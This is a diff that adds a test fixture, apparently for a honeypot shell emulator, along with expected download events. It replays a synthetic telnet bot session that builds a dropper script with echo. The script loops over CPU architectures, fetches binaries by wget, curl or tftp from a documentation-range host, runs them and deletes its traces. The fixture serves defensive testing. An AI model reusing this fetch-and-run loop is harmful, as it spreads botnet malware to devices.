@@ -1,0 +1,48 @@
+# A dropper written line by line with echo and then run, the way a telnet bot sent it on 2026-10-08
+# (host replaced with a documentation address). Writing the script fetches nothing: the download
+# events belong to the line that runs it and name the URL the loop expanded, not the `$a` the
+# script text carries. The fake wget succeeds, but the persona is x86_64: running the mips, mpsl,
+# arm4, arm5, arm6 and arm7 builds fails with dash's `Exec format error` (status 126), so the loop
+# falls through to its `|| chmod +x $a` branch, whose chmod finds no such file and stops that
+# branch, and goes on to the next name. The x86_64 build runs, so `&& break` ends the loop there
+# and x86 is never asked for. The `sh: 3:` prefix is how the shell words every dash script error
+# today; a real dash names the script (`.s: 3:`), which is a separate known gap.
+# source: synthetic reproduction of an echo-assembled arch-loop dropper seen 2026-10-08
+# date: 2026-10-08
+# protocol: telnet
+# persona: ubuntu
+$ echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s
+@downloads
+@events 1
+$ echo 'wget -q http://198.51.100.9/$a -O .c||curl -s http://198.51.100.9/$a -o .c||tftp -g -l .c -r $a 198.51.100.9||tftp -g -l $a 198.51.100.9' >> .s
+@downloads
+@events 1
+$ echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s
+@downloads
+@events 1
+$ echo 'rm -f .c $a' >> .s
+@downloads
+@events 1
+$ echo 'done' >> .s
+@downloads
+@events 1
+$ sh .s; rm -f .s
+> sh: 3: ./.c: Exec format error
+> chmod: cannot access 'mips': No such file or directory
+> sh: 3: ./.c: Exec format error
+> chmod: cannot access 'mpsl': No such file or directory
+> sh: 3: ./.c: Exec format error
+> chmod: cannot access 'arm4': No such file or directory
+> sh: 3: ./.c: Exec format error
+> chmod: cannot access 'arm5': No such file or directory
+> sh: 3: ./.c: Exec format error
+> chmod: cannot access 'arm6': No such file or directory
+> sh: 3: ./.c: Exec format error
+> chmod: cannot access 'arm7': No such file or directory
+@downloads http://198.51.100.9/mips http://198.51.100.9/mpsl http://198.51.100.9/arm4 http://198.51.100.9/arm5 http://198.51.100.9/arm6 http://198.51.100.9/arm7 http://198.51.100.9/x86_64
+@events 8
+$ ls .c .s
+> ls: cannot access '.s': No such file or directory
+> .c
+@downloads
+@events 1
